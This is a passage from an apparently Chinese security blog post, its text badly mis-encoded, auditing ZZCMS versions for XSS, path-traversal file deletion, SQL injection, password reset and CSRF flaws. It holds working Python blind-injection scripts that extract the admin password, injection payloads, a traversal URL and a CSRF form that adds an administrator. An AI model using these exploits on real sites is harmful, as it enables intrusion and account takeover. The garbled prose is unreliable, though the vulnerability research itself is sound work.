æˆäº†æ•°æ®åœ¨è¿›è¡Œå®ä½“åŒ–å­˜å…¥æ•°æ®åº“ç„¶åè¿˜åŸæˆåŸæ¥çš„æ•°æ®æ²¡æœ‰è¿›è¡Œè¿‡æ»¤,ä¼šå¯¼è‡´æ³¨å…¥è¯­å¥è¢«æˆåŠŸæ‰§è¡Œ<br><strong>æ¼æ´å¤ç°</strong><br>åœ¨æ³¨å†Œä¸€ä¸ªç”¨æˆ·test åœ¨å‘å¸ƒèµ„è®¯æˆ–è€…å…¬å¸æ–°é—» ç‚¹å‡»æºç å†å‘é€XSSæ³¨å…¥ä»£ç <br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0pu8m3y8lj30ug0by75l.jpg" alt=""><br>å‘å¸ƒæˆåŠŸä¹‹åç‚¹å‡»æµè§ˆ å‘ç°æˆåŠŸè§¦å‘JS<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0pud0oj3fj30z00bkwhn.jpg" alt=""></p><h2 id="ä»»æ„æ–‡ä»¶åˆ é™¤"><a href="#ä»»æ„æ–‡ä»¶åˆ é™¤" class="headerlink" title="ä»»æ„æ–‡ä»¶åˆ é™¤"></a>ä»»æ„æ–‡ä»¶åˆ é™¤</h2><p><strong>æ¼æ´æ–‡ä»¶:</strong> /user/adv.php,/user/licence_save.php,/user/ppsave.php ç­‰å…·æœ‰æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½çš„æ–‡ä»¶</p><p><strong>æ¼æ´åŸå› :</strong> <strong>.</strong> å’Œ <strong>/</strong> å­—ç¬¦æ²¡æœ‰è¿‡æ»¤è€Œå¯¼è‡´å¤¸ç›®å½•åˆ é™¤æ–‡ä»¶</p><p><strong>æ¼æ´åˆ†æ:</strong><br>åœ¨ä¸ªäººä¸­å¿ƒé‡Œé¢,æœ‰å¾ˆå¤šä¸Šä¼ å›¾ç‰‡çš„åŠŸèƒ½åŠå¯¹å›¾ç‰‡è¿›è¡Œä¿®æ”¹ï¼Œè¿™äº›æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½çš„ä»£ç å‡ ä¹éƒ½æ²¡æœ‰è¿›è¡Œè¿‡æ»¤éªŒè¯,å°±å¯¼è‡´äº†å¤¸ç›®å½•åˆ é™¤æ–‡ä»¶<br>æ¯”å¦‚åœ¨ /user/ppsave.php<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0rv0p9f8xj30jn060t91.jpg" alt=""></p><p>è¿™é‡Œä»…ä»…åªæ˜¯åˆ¤æ–­äº†oldimg ä¸img æ˜¯å¦ç›¸ç­‰ ä¸ç›¸ç­‰å°±åˆ é™¤oldimg è€Œä¸” oldimg ä¸ img æ˜¯é€šè¿‡POSTæ¥æ”¶,åªæ˜¯trimä¸€ä¸‹æ²¡æœ‰è¿›è¡Œä»»ä½•å¯¹ . / ç­‰å±é™©å­—ç¬¦è¿›è¡Œè¿‡æ»¤,è€Œä¸”è¿›è¡Œä¼ªé€  è¿‡åˆ†ç›¸ä¿¡äº†ç”¨æˆ·çš„è¾“å…¥</p><p><strong>æ¼æ´å¤ç°:</strong><br>æˆ‘ä»¬åœ¨ä¸ªäººä¸­å¿ƒ éšä¾¿æ‰¾ä¸€ä¸ª å¯ä»¥ä¸Šä¼ æ–‡ä»¶çš„é¡µé¢ å°±æ‹¿adv.php è¿™ä¸ªé¡µé¢ æˆ‘ä»¬ç‚¹å‡»ä¿®æ”¹ ç„¶åæŠ“åŒ… ä¿®æ”¹ oldimg ä¸img ä¸ºäº†ä¾¿äºæµ‹è¯• æˆ‘ä»¬å…ˆå»ºä¸€ä¸ªtestæ–‡ä»¶å¤¹ ç„¶ååœ¨é‡Œé¢æ–°å»ºä¸€äº›æ–‡ä»¶</p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0rvkyevvrj30q609wgm2.jpg" alt=""></p><p>ä¿®æ”¹oldimg = test/test.txt<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0rvo68hkij30xl0e8whl.jpg" alt=""></p><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„test.txt è¢«åˆ é™¤äº†<br>åœ¨ZZcms8.2 ç‰ˆæœ¬ä¸­ä¸Šä¼ åŠŸèƒ½ä»£ç å‡ å·éƒ½æ˜¯é‚£æ ·å†™çš„ è¿™æ ·å°±å¯¼è‡´äº†å¾ˆå¤šæœ‰ä¸Šä¼ åŠŸèƒ½çš„æ–‡ä»¶ éƒ½æ˜¯æœ‰æ¼æ´çš„</p><h2 id="sqlæ³¨å…¥"><a href="#sqlæ³¨å…¥" class="headerlink" title="sqlæ³¨å…¥"></a>sqlæ³¨å…¥</h2><p><strong>æ¼æ´æ–‡ä»¶:</strong> /user/adv2.php CVEï¼šCVE-2018-8967</p><p><strong>æ¼æ´åŸå› :</strong>  ç›´æ¥æ‹¼æ¥,æ²¡æœ‰ç”¨å¼•å·åŒ…è£¹</p><p><strong>æ¼æ´åˆ†æ:</strong></p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0r1ezsusdj30xc04e0t9.jpg" alt=""><br>åœ¨72è¡Œå¯çœ‹åˆ° ç›´æ¥æ‹¼æ¥POSTè¿›æ¥çš„å€¼ä¸” æ²¡æœ‰ç”¨å¼•å·åŒ…è£¹ è¿™å°±é€ æˆäº†è™½ç„¶å¼€å¤´åŒ…å«äº†è¿‡æ»¤sqlæ³¨å…¥æ–‡ä»¶å¯¹æ‰€æœ‰get,post è¿›è¡Œæ¶ˆæ¯’ï¼Œä½†æ˜¯åˆæ˜¯ç›´æ¥æ‹¼æ¥å› ä¸ºæ²¡æœ‰ç”¨å¼•å·åŒ…è£¹,æ‰€ä»¥ä¸ç”¨å•å¼•å·ä¹Ÿå¯ä»¥ç›´æ¥è¿›è¡Œsqlæ³¨å…¥ã€‚<br>è¦æƒ³è¿›å…¥è¿™ä¸ªè¯­å¥,éœ€è¦æ»¡è¶³ $a+$c &gt;0<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0r1r2v6ysj30oo0bbwfb.jpg" alt=""><br>å³åœ¨zzcms_zhæˆ–è€…zzcms_mainè¡¨æŸ¥è¯¢åˆ°æœ‰è®°å½•</p><p><strong>æ¼æ´å¤ç°:</strong></p><p>å…ˆç¡®ä¿  </p><ol><li>zzcms_zhæˆ–è€…zzcms_mainè¡¨æœ‰æ•°æ® ä¸ç„¶æ— æ³•è¿›å…¥æ‰§è¡Œsqlè¯­å¥</li><li>zzcms_ad è¡¨æœ‰æ•°æ® å¦‚æœä¸ºç©ºæ—¶ åé¢çš„ç›²æ³¨å°†ä¸ä¼šæœ‰ä»»ä½•å»¶è¿Ÿ</li></ol><p>æˆ‘ä»¬å…ˆæ³¨å†Œä¼ä¸šç”¨æˆ·åœ¨ä¸ªäººä¸­å¿ƒç‚¹å‡»æŠ¢å å¹¿å‘Šä½(æ²¡æœ‰å¯ç™»å…¥åå°è¿›è¡Œæ·»åŠ ) ç„¶åç‚¹å‡»æŠ¢å è¿™ä¸ªä½ç½®æ—¶è¿›è¡ŒæŠ“åŒ…<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0r27u4oohj30zh0glacb.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0r2b9fd30j310z0ahwg9.jpg" alt=""><br>å¯ä»¥çœ‹åˆ° ä¼šPOSTä¸€ä¸ªidäº¤ç»™adv2.php,æ¥ä¸‹æ¥æ„é€ ç›²æ³¨<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0r3grydu9j30zk0lcwhk.jpg" alt=""><br>å³ä¸‹è§’çœ‹åˆ°å»¶è¿Ÿ10ç§’,è¯´æ˜æ‰§è¡ŒæˆåŠŸ POCå¦‚ä¸‹</p><pre><code>   import requestsimport timeurl = &quot;http://127.0.0.1/user/adv2.php?action=modify&quot;flag = &quot;&quot;for j in xrange(1,20):    for i in xrange(31,128):        payload = &quot;id=1 or if(select ascii(substr(pass,{num},1)) from zzcms_admin) = {index},sleep(5),1)%23&quot;.format(num=j,index=i)        strart_time = time.time()        r = requests.post(url,data=payload,headers={&quot;Content-Type&quot;:&quot;application/x-www-form-urlencoded&quot;})        end_time = time.time()        cost = end_time - strart_time        if cost &gt; 5:            flag +=chr(i)            print flag            breakprint &apos;flag is  %s &apos; % flag</code></pre><p><strong>æ¼æ´æ–‡ä»¶:</strong> /dl/dl_sendmail.php<br><strong>æ¼æ´åŸå› :</strong> ç›´æ¥æ‹¼æ¥è¿›sqlè¯­å¥ä¸­ æ²¡æœ‰è¿›è¡Œè¿‡æ»¤ ä½¿ç”¨å±é™©å‡½æ•°stripfxg()<br><strong>CVE:</strong> CVE-2018-9309<br><strong>æ¼æ´åˆ†æ:</strong><br>æ­¤æ–‡ä»¶æ˜¯ç»™ä»£ç†å‘é‚®ä»¶æ—¶ä¼šå°†æ•°æ®å‘é€ç»™dl_sendmail.phpå¤„ç†<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0rxagjqpzj30vd0b4mym.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0ry5akoqmj30kd03i74f.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0ry5vw7zrj30hj02kdfu.jpg" alt=""><br>ä»POSTæ¥å—è¿‡æ¥çš„sql è¿›è¡Œstripfxg()å¤„ç†ç„¶åèµ‹ç»™äº†session æœ€åæ‹¼æ¥ æ‰§è¡Œsqlè¯­å¥ï¼Œä¸”æ²¡æœ‰ç”¨å·åŒ…è£¹,åœ¨ä¹‹å‰å°±åˆ†æåˆ†æè¿‡è¿™ä¸ªæ–¹æ³•<br>è¿™æ˜¯å°†è¢«è½¬ä¹‰çš„å­—ç¬¦è¿˜åŸ ç®€å•æ¥è¯´å°±æ˜¯ è¾“å…¥ â€˜ å¦‚æœç»è¿‡è½¬ä¹‰ åˆ°æ•°æ®åº“ä¼šå˜ä¸º â€˜\ å–å‡ºæ¥æŸ¥çœ‹æ˜¯å¦è¿›è¿‡è½¬ä¹‰ è¿˜åŸä¸º â€˜ å‘ˆç°ç»™ç”¨æˆ·<br>ä½¿ç”¨äº†è¿™ä¸ªå±é™©å‡½æ•°stripfxg() ä»–å¯ä»¥å°†å…¨å±€è¿‡æ»¤è¿˜åŸæˆæ­£å¸¸çš„æ•°æ®ï¼Œå¦‚æœè¿™ä¸ªæ•°æ®å¸¦å…¥äº†sqlæŸ¥è¯¢ä¸­ï¼Œä¼šç›´æ¥é€ æˆæ³¨å…¥çš„ã€‚<br><strong>æ¼æ´å¤ç°:</strong><br>è¿›è¡Œå¤ç°æ—¶è¦ä¿è¯ zzcms_msg æœ‰æ•°æ® ä¸” æœ‰ä¸ªelite å±æ€§å€¼ä¸º1<br>ç‚¹å‡»å‘é‚®ä»¶ ç„¶åæŠ“åŒ… ä¿®æ”¹sql å†…å®¹<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0ry1bz3waj30zk0lcdj1.jpg" alt=""></p><p>è¿™é‡Œæˆ‘ç”¨çš„ç›²æ³¨,å¯çœ‹åˆ°æˆåŠŸå»¶è¿Ÿ10ç§’</p><p><strong>æ¼æ´æ–‡ä»¶:</strong> www/user/del.php<br><strong>æ¼æ´åŸå› :</strong> ç›´æ¥æ‹¼æ¥è¿›sqlè¯­å¥ä¸­<br><strong>CVE:</strong> CVE-2018-9309<br><strong>æ¼æ´åˆ†æ:</strong><br>å°†del.php æ”¾å…¥Seayå®¡è®¡ç³»ç»Ÿå¯æ¸…æ¥šçš„çŸ¥é“æ­¤æ–‡ä»¶æœ‰å“ªäº›å˜é‡ æ–¹ä¾¿è¿›è¡Œå®¡è®¡<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0ojmhuoe9j30v10ii40o.jpg" alt=""><br>é¦–å…ˆå¯¹ä¼ å…¥çš„pagename,tablename è¿›è¡Œäº†ç®€å•å»ç©ºå¤„ç† id è¢«chekid()å‡½æ•°è¿›è¡Œäº†å¤„ç†,æ‰¾åˆ°checkid()<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0okeij9dcj30o805v3z2.jpg" alt=""><br>å¯¹idè¿›è¡Œäº†è¿‡æ»¤ï¼Œæ¥ç€åœ¨switchè¯­å¥ä¸­ sqlè¯­å¥åªæœ‰å¯¹idè¿›è¡Œæ‹¼æ¥æ“ä½œ ä¹Ÿä¸å­˜åœ¨sqlæ³¨å…¥  æ¥ç€å¾€ä¸‹çœ‹ å½“$tablenameä¸æ»¡è¶³ifå’Œelseif çš„æ¡ä»¶çš„æ—¶å€™,å‘ç°æˆ‘ä»¬ä¼ å…¥çš„tablename ç›´æ¥è¢«æ‹¼æ¥åˆ°äº†sqlè¯­å¥å½“ä¸­å¹¶ä¸”tablenameå˜é‡ä¹Ÿæ²¡æœ‰ç”¨å•å¼•å·åŒ…è£¹ æ²¡æœ‰è¿›è¡Œä»»ä½•è¿‡æ»¤<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0otawhn3tj30ky0440sx.jpg" alt=""><br><strong>æ¼æ´å¤ç°:</strong><br>å…ˆæ³¨å†Œä¸€ä¸ªè´¦æˆ· test(ä¸ç”¨æ³¨å†Œç™»å…¥ä¹Ÿæ˜¯å¯ä»¥è¿›è¡Œæ³¨å…¥çš„) ç„¶åç‚¹å‡»å‘å…¬å¸æ–°é—»å…ˆå‘å¸ƒä¸€æ¡ä¿¡æ¯ï¼Œåœ¨æ•°æ®åº“æŸ¥çœ‹ å‘ç° å·²ç»å­˜å…¥æ•°æ®åº“å½“ä¸­<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0on1hdm00j30w509jgn1.jpg" alt=""><br>æ¥ä¸‹æ¥æˆ‘ä»¬å†åˆ é™¤è¿™æ¡ä¿¡æ¯çš„æ—¶å€™æŠ“åŒ…<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0op1fek6sj30kw08g0tf.jpg" alt=""><br>çœ‹åˆ°  åˆ é™¤çš„æ—¶å€™ä¼šå°†tablename å‘é€ç»™del.php å¤„ç† äºæ˜¯æ„é€ sqlæ³¨å…¥<br>post:<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">1</span>&amp;tablename=zzcms_zx where id=<span class="number">1</span> union select <span class="number">1</span>,<span class="number">2</span> and if((ascii(substr(user(),<span class="number">1</span>,<span class="number">1</span>)) = <span class="number">114</span>),sleep(<span class="number">10</span>),<span class="number">1</span>)#</span><br></pre></td></tr></table></figure></p><p>ç”¨unionè¯­å¥ ä»¥å…å› ä¸ºå‰é¢çš„select è¯­å¥ä¸ºç©ºè€Œæ³¨å…¥å¤±è´¥<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0opyuds18j30z50d30uq.jpg" alt=""><br>å³ä¸‹è§’æ˜¾ç¤ºå»¶è¿Ÿ10 ç§’ è¯´æ˜æˆåŠŸæ³¨å…¥<br>è¿™é‡Œéœ€è¦æ³¨æ„ ä¸èƒ½ç”¨ å¤§äºå·å’Œå°äºå· å‰é¢å·²ç»è¯´è¿‡è¿™ä¸ªcmsä¼šåœ¨ inc/stopsqlin.php ä¸­ ç”¨addslashes()ã€htmlspecialchars() å¯¹get å’Œ post è¿‡æ¥çš„å€¼è¿›è¡Œå¤„ç†<br>POCå¦‚ä¸‹ py2ç¯å¢ƒä¸‹æˆåŠŸè¿è¡Œ<br><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import <span class="built_in">time</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://127.0.0.1/user/del.php"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">xrange</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">xrange</span>(<span class="number">31</span>,<span class="number">128</span>):</span><br><span class="line">        payload = <span class="string">"id=1&amp;tablename=zzcms_zx where id=1 union select 1,2 and if(ascii(substr(database(),&#123;num&#125;,1)) = &#123;index&#125;,sleep(5),1)%23"</span>.format(<span class="built_in">num</span>=j,index=i)</span><br><span class="line"></span><br><span class="line">        strart_time = <span class="built_in">time</span>.<span class="built_in">time</span>()</span><br><span class="line">        r = requests.post(url,data=payload,headers=&#123;<span class="string">"Content-Type"</span>:<span class="string">"application/x-www-form-urlencoded"</span>&#125;)</span><br><span class="line">        end_time = <span class="built_in">time</span>.<span class="built_in">time</span>()</span><br><span class="line"></span><br><span class="line">        cost = end_time - strart_time</span><br><span class="line">        <span class="keyword">if</span> cost &gt; <span class="number">5</span>:</span><br><span class="line">            flag +=chr(i)</span><br><span class="line">            <span class="built_in">print</span> flag</span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line"><span class="built_in">print</span> 'flag <span class="built_in">is</span>  <span class="built_in">%s</span> ' <span class="symbol">%</span> flag</span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0ote7zwxhj311x0ivgn9.jpg" alt=""></p><p><strong>æ¼æ´æ–‡ä»¶:</strong> /user/check.php<br><strong>æ¼æ´åŸå› :</strong> getip()ä¸­æ²¡æœ‰è¿›è¡Œè¿‡æ»¤</p><p><strong>æ¼æ´åˆ†æ:</strong><br>check.php æ˜¯ä¸ªæ£€æŸ¥ç”¨æˆ·ç™»å…¥çŠ¶æ€æ–‡ä»¶ å¾ˆå¤šæ–‡ä»¶éƒ½åŒ…å«æ­¤æ–‡ä»¶<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0rz5sguycj30s504adgm.jpg" alt=""><br>è¿™è¡Œsqlè¯­å¥è°ƒç”¨äº†getip()æ¥è·å–ipå€¼,æ¥ç€çœ‹çœ‹è¿™ä¸ªå‡½æ•°<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0rz8zgypvj30sq085t9t.jpg" alt=""><br>å‘ç°åªæ˜¯å•çº¯çš„ä»HTTPç›´æ¥æ¢å–ipå€¼ æ²¡æœ‰è¿›è¡Œè¿‡æ»¤ æ¥ä¸‹æ¥è¿›è¡ŒXFFæ³¨å…¥</p><p><strong>æ¼æ´å¤ç°:</strong><br>åªè¦åŒ…å«äº†check.php éƒ½å¯ä»¥è¿›è¡ŒXFFæ³¨å…¥<br>X-Forwarded-Forâ€™:1â€™or sleep(7)</p><h2 id="ä»»æ„ç”¨æˆ·å¯†ç ä¿®æ”¹"><a href="#ä»»æ„ç”¨æˆ·å¯†ç ä¿®æ”¹" class="headerlink" title="ä»»æ„ç”¨æˆ·å¯†ç ä¿®æ”¹"></a>ä»»æ„ç”¨æˆ·å¯†ç ä¿®æ”¹</h2><p><strong>æ¼æ´æ–‡ä»¶:</strong> /one/getpassword.php<br><strong>æ¼æ´åˆ†æ:</strong><br>getpassword.php æ˜¯ç”¨æ¥æ‰¾å›å¯†ç åŠŸèƒ½çš„æ–‡ä»¶ä»£ç <br>é€šè¿‡åˆ¤æ–­$actionçš„å€¼æ¥è¿›è¡Œç›¸åº”çš„æ­¥éª¤<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0sbovb4psj30u9042gly.jpg" alt=""><br>åœ¨73è¡Œèµ· å¦‚æœ$action=step3 <code>$_SESSION[&#39;username&#39;]</code> ä¸ä¸ºç©º ç„¶åå°±è¿›è¡Œupdateæ“ä½œ<br><code>$_SESSION[&#39;username&#39;]</code>åˆæ˜¯ä»step1 ä¸­ postä¼ é€’è¿‡æ¥çš„ usernameï¼Œå°±å¯¼è‡´äº†usernameå¯æ§<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0sbtwhnfcj30mc06hjs5.jpg" alt=""></p><p><strong>æ¼æ´å¤ç°:</strong><br>é¦–å…ˆç¬¬ä¸€æ­¥ å…ˆè¾“å…¥è¦æ‰¾å›å¯†ç çš„ç”¨æˆ·å ç‚¹å‡»ä¸‹ä¸€æ­¥æ—¶æŠ“åŒ…<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0sc9fo7o4j30rv0f9q49.jpg" alt=""><br>è¿™æ ·å°±æœ‰äº†sessionå€¼<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0scjo9xtlj30j8090gm9.jpg" alt=""></p><p>ç„¶åå°†actionæ”¹ä¸ºstep3 ä¿®æ”¹POSTæ•°æ® passwordçš„å€¼å°±æ˜¯ä¿®æ”¹çš„å¯†ç <br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0scr3b20cj30z20d076i.jpg" alt=""><br>å¯ä»¥çœ‹åˆ° testç”¨æˆ·å¯†ç ä¿®æ”¹æˆåŠŸ ç„¶åè¿›è¡Œç™»å…¥ ç™»å…¥æˆåŠŸ</p><h1 id="ZZCMS-8-3"><a href="#ZZCMS-8-3" class="headerlink" title="ZZCMS 8.3"></a>ZZCMS 8.3</h1><p>é¦–å…ˆçœ‹å®˜ç½‘å¯¹ä¹‹å‰ç‰ˆæœ¬çš„å¤„ç†<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0z4d3irxcj30tt0940tr.jpg" alt=""></p><p>è™½ç„¶æ›´æ–°åˆ°8.3 ä½†æ˜¯è¿˜æ˜¯å­˜åœ¨å¾ˆå¤š æ¼æ´  æœ‰äº›åœ¨8.2å­˜åœ¨çš„æ¼æ´åœ¨8.3ä¹Ÿæ²¡æœ‰è§£å†³<br>æ‰€ä»¥å¾ˆå¤šæ¼æ´åœ¨8.2ç‰ˆæœ¬ä¹Ÿå°±æœ‰äº†<br>å¯ä»¥çœ‹åˆ° <strong>/dl/dl_sendmail.php</strong> è¿™ä¸ªsqlæ¼æ´åœ¨8.3è¿˜å­˜åœ¨</p><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>å…¶å®è¿™ä¸ªä¹Ÿåœ¨8.2å­˜åœ¨,æ•´ä¸ªCMSç®¡ç†åå°è®¾è®¡æ“ä½œçš„è¡¨å•æ²¡æœ‰è®¾ç½®tokenéªŒè¯ï¼Œå¯¼è‡´äº†å¯ä»¥è¿›è¡Œå¤¸ç«™è¯·æ±‚ä¼ªé€ </p><p><strong>æ¼æ´å¤ç°:</strong><br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">&lt;html&gt;</span></span><br><span class="line">  <span class="symbol">&lt;body&gt;</span></span><br><span class="line">  <span class="symbol">&lt;script&gt;</span><span class="keyword">history</span>.pushState(<span class="string">''</span>, <span class="string">''</span>, <span class="string">'/'</span>)&lt;/script&gt;</span><br><span class="line">    &lt;form action=<span class="string">"http://127.0.0.1/test/adminadd.php?action=add"</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">      &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"groupid"</span> value=<span class="string">"1"</span> /&gt;</span><br><span class="line">      &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"admins"</span> value=<span class="string">"123"</span> /&gt;</span><br><span class="line">      &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"passs"</span> value=<span class="string">"123"</span> /&gt;</span><br><span class="line">      &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"passs2"</span> value=<span class="string">"123"</span> /&gt;</span><br><span class="line">      &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">"submit"</span> value=<span class="string">"Submit request"</span> /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html</span><br></pre></td></tr></table></figure></p><p>å¦‚æœç®¡ç†å‘˜ç‚¹å‡»,å°±ä¼šæ·»åŠ ç®¡ç†å‘˜ç”¨æˆ·</p><h1 id="ZZCMS-2018"><a href="#ZZCMS-2018" class="headerlink" title="ZZCMS 2018"></a>ZZCMS 2018</h1><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g10aywgajbj30hv04qq30.jpg" alt=""></p><h2 id="ä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´"><a href="#ä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´" class="headerlink" title="ä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´"></a>ä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´</h2><p>CVE-2019-8411<br> <strong>æ¼æ´æ–‡ä»¶</strong> /admin/dl_data.php<br> <strong>æ¼æ´åˆ†æ</strong><br> çœ‹åˆ°è¿™ä¸ªè¿™ä¸ªæ¼æ´,æˆ‘å†å›è¿‡å¤´çœ‹8.2å’Œ8.3 ç‰ˆæœ¬ çš„æºä»£ç  å‘ç°åŸæ¥æ˜¯æ—©å°±åœ¨8.2å­˜åœ¨çš„æ¼æ´</p><p> <img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0z6cbmz8gj30lx059dg2.jpg" alt=""></p><p> ç›´æ¥ä»getè·å–filenameçš„å€¼ æ‹¼æ¥åˆ°$fp ä¹Ÿæ²¡æœ‰ç”¨å•å¼•å·åŒ…è£¹ ç„¶åç›´æ¥è¿›è¡Œæ–‡ä»¶åˆ é™¤</p><p> <strong>æ¼æ´å¤ç°:</strong></p><p> é¦–å…ˆåœ¨wwwwç›®å½•ä¸‹æ–°å»ºtestç›®å½•,åœ¨testç›®å½•ä¸‹å»ºä¸€ä¸ªyang.txtæ–‡ä»¶ï¼Œç„¶ååœ¨æµè§ˆå™¨è¾“å…¥</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/admin/</span>dl_data.php?action=del&amp;filename=..<span class="regexp">/test/y</span>ang.txt</span><br></pre></td></tr></table></figure><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g10ax6sndqj30z60a0q43.jpg" alt=""><br>å‘ç°,yang.txtå·²ç»è¢«åˆ é™¤äº†</p><h1 id="zzcms-2019"><a href="#zzcms-2019" class="headerlink" title="zzcms 2019"></a>zzcms 2019</h1><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0z4uz95rej30ws06i3zc.jpg" alt=""><br>åœ¨å¯¹2019ç‰ˆæœ¬éšä¾¿æµ‹è¯•äº†ä¸€ä¸‹<br>å‘ç°2019ç‰ˆæœ¬è¿˜æ˜¯æœ‰ä¸€éƒ¨åˆ†åœ¨8.2å­˜åœ¨çš„XSSæ¼æ´æ¼æ´è¿˜æ²¡ä¿®å¤</p><h2 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h2><p>è¿™ä¸ªå­˜å‚¨å‹xssæ³¨å…¥æ¼æ´ æ˜¯åœ¨å‰ä¸ä¹…çˆ†å‡ºæ¥çš„ æ¯”cmså®˜ç½‘å†™çš„æœ€æ–°æ›´æ–°æ—¶é—´æ™š  è¯´æ˜è¿™ä¸ªæ¼æ´è¿˜æ²¡ä¿®å¤,å¯æ˜¯å½“æˆ‘å»å®˜ç½‘ä¸‹è½½è¿™ä¸ªcmsè¿›è¡Œå¤ç°æ—¶å¤ç°ä¸äº† å‘ç°å·²ç»è¢«æ‚„æ‚„ä¿®å¤äº† å“¼~  æ‰€ä»¥åªèƒ½è®²ä¸‹åŸç†</p><p><strong>æ¼æ´æ–‡ä»¶</strong> /user/ask.php // è¿™æ˜¯ä¸ªå‘é—®ç­”çš„åŠŸèƒ½æ–‡ä»¶<br><strong>æ¼æ´åˆ†æ</strong><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$do=<span class="keyword">isset</span>($_GET[<span class="string">'do'</span>])?$_GET[<span class="string">'do'</span>]:<span class="string">''</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">switch</span> ($do) &#123;</span></span><br><span class="line"><span class="php"><span class="keyword">case</span> <span class="string">"add"</span>:add();<span class="keyword">break</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">case</span> <span class="string">"modify"</span>:modify();<span class="keyword">break</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure></p><p>æ‰¾åˆ°modify()<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1662802twj30ps0b9myk.jpg" alt=""><br>å†è·Ÿè¿›markit() åœ¨ /inc/function.php<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1664mp70aj30zp03n74n.jpg" 